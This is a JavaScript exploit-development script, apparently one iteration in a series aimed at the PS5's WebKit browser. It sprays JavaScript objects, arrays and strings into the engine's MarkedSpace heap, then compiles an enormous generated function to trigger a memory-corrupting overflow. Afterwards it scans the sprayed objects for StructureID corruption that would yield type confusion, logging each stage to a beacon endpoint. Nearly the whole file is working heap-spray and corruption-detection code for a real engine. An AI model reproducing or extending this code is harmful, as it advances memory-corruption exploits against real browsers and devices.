// p385 - StructureID corruption detection via MarkedSpace spray
//
// V384 FINDING: sweep reliably hits MarkedSpace (JSString m_length) but NOT
// FastMalloc marge or IsoHeap data. MarkedSpace is higher in virtual address space.
//
// APPROACH: Spray JSObjects in MarkedSpace. After overflow, check if any object's
// StructureID got corrupted by the sweep. Corrupted StructureID = type confusion
// (decode() is pure mask+offset on PS5, no validation in release).
//
// Sweep write pattern (112-byte stride):
//   entry+12: 0xFFFFFFFF (4B)
//   entry+24: thunk pointer (8B)
//   entry+64: bit fields (4B)
//   entry+68: bytecodeIndex (4B)
//
// For 32-byte MarkedSpace cells with meta_base 32-aligned:
//   - bit fields hit cell_base+0 (StructureID!) for odd entries
//   - thunk hits cell_base+8 (butterfly/m_fiber) for even entries
//   - 0xFFFFFFFF and bytecodeIndex hit offsets 12 and 20 within cells
//
// Detection:
//   - typeof changes
//   - property access returns wrong value or throws
//   - constructor changes
//   - Array.isArray flips
//
// Beacon prefix: V385-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V385-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V385-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }

  B('BOOT');

  // === Phase 1: Spray objects in MarkedSpace ===
  var N_OBJ = 4000;
  var N_ARR = 2000;
  var objs = new Array(N_OBJ);
  var arrs = new Array(N_ARR);

  // Plain objects with inline property
  for (var i = 0; i < N_OBJ; i++) {
    objs[i] = { _m: i, _v: 0x42424242 + i };
  }
  B('OBJ-' + N_OBJ);

  // Arrays with known content
  for (var i = 0; i < N_ARR; i++) {
    arrs[i] = [i, i + 0.5, i + 1];
  }
  B('ARR-' + N_ARR);

  // Also spray strings as alignment oracle (they reliably show m_length corruption)
  var strs = new Array(10);
  for (var i = 0; i < 10; i++) {
    var s = '';
    for (var j = 0; j < 100; j++) s += 'SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS';
    s = s.substring(0, 1000);
    s.charCodeAt(0);
    strs[i] = s;
  }
  B('STR-10');

  // === Phase 2: GC + Build ===
  var gcR = 0;
  function gc() {
    for (var j = 0; j < 500; j++) new ArrayBuffer(4096);
    gcR++;
    if (gcR < 20) setTimeout(gc, 20);
    else { B('GC-' + gcR); build(); }
  }
  gc();

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p385fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p385ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p385ok ? 'OK' : 'FAIL'));
      setTimeout(scan, 100);
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }

  // === Phase 3: Scan for corruption ===
  function scan() {
    B('SCAN');

    // 3a: String oracle
    var sCorrupt = 0;
    for (var i = 0; i < strs.length; i++) {
      try {
        var len = strs[i].length;
        if (len !== 1000) { sCorrupt++; B('S' + i + '-LEN-' + len); }
      } catch(e) { sCorrupt++; B('S' + i + '-ERR-' + (e.message || '').substring(0, 20)); }
    }
    B('SORACLE-' + sCorrupt);

    // 3b: Object scan
    var objHits = 0;
    var objCrash = 0;
    var objType = 0;
    var objValue = 0;
    var objProto = 0;

    for (var i = 0; i < N_OBJ; i++) {
      try {
        var o = objs[i];

        // typeof check
        var t = typeof o;
        if (t !== 'object') {
          objType++;
          if (objType <= 5) B('O' + i + '-TYPE-' + t);
        }

        // property value check
        var m = o._m;
        if (m !== i) {
          objValue++;
          if (objValue <= 5) B('O' + i + '-VAL-' + m + '-exp' + i);
        }

        var v = o._v;
        var exp = 0x42424242 + i;
        if (v !== exp) {
          objValue++;
          if (objValue <= 10) B('O' + i + '-V2-' + v + '-exp' + exp);
        }

        // constructor check
        try {
          var cn = o.constructor;
          if (cn !== Object) {
            objProto++;
            if (objProto <= 5) {
              var name = 'unknown';
              try { name = cn.name || cn.toString().substring(0, 20); } catch(e2) {}
              B('O' + i + '-CTOR-' + name);
            }
          }
        } catch(e) {
          objProto++;
          if (objProto <= 5) B('O' + i + '-CTORERR');
        }

      } catch(e) {
        objCrash++;
        if (objCrash <= 10) B('O' + i + '-CRASH-' + (e.message || '').substring(0, 30));
      }
    }
    B('OBJ-TYPE' + objType + '-VAL' + objValue + '-PROTO' + objProto + '-CRASH' + objCrash);

    // 3c: Array scan
    var arrHits = 0;
    var arrLen = 0;
    var arrVal = 0;
    var arrIsArr = 0;
    var arrCrash = 0;

    for (var i = 0; i < N_ARR; i++) {
      try {
        var a = arrs[i];

        // Array.isArray check
        try {
          if (!Array.isArray(a)) {
            arrIsArr++;
            if (arrIsArr <= 5) B('A' + i + '-NOTARR-typeof' + (typeof a));
          }
        } catch(e) {
          arrIsArr++;
          if (arrIsArr <= 5) B('A' + i + '-ISARRERR');
        }

        // length check
        var len = a.length;
        if (len !== 3) {
          arrLen++;
          if (arrLen <= 5) B('A' + i + '-LEN-' + len);
        }

        // value check
        var v0 = a[0];
        if (v0 !== i) {
          arrVal++;
          if (arrVal <= 5) B('A' + i + '-V0-' + v0 + '-exp' + i);
        }

      } catch(e) {
        arrCrash++;
        if (arrCrash <= 10) B('A' + i + '-CRASH-' + (e.message || '').substring(0, 30));
      }
    }
    B('ARR-LEN' + arrLen + '-VAL' + arrVal + '-ISARR' + arrIsArr + '-CRASH' + arrCrash);

    // 3d: Total summary
    var totalHits = objType + objValue + objProto + objCrash + arrLen + arrVal + arrIsArr + arrCrash;
    B('TOTAL-HITS-' + totalHits);

    // 3e: If any hits, do deeper inspection
    if (totalHits > 0) {
      B('DEEPER-SCAN');
      // Re-scan objects for detailed corruption patterns
      var patterns = {};
      for (var i = 0; i < N_OBJ; i++) {
        try {
          var o = objs[i];
          var t = typeof o;
          var m = o._m;
          if (t !== 'object' || m !== i) {
            var key = t + ':' + (m === i ? 'ok' : 'wrong');
            patterns[key] = (patterns[key] || 0) + 1;
          }
        } catch(e) {
          patterns['crash'] = (patterns['crash'] || 0) + 1;
        }
      }
      var pk = Object.keys(patterns);
      for (var i = 0; i < pk.length && i < 10; i++) {
        B('PAT-' + pk[i] + '-' + patterns[pk[i]]);
      }
    }

    B('ALL-DONE');
  }
})();
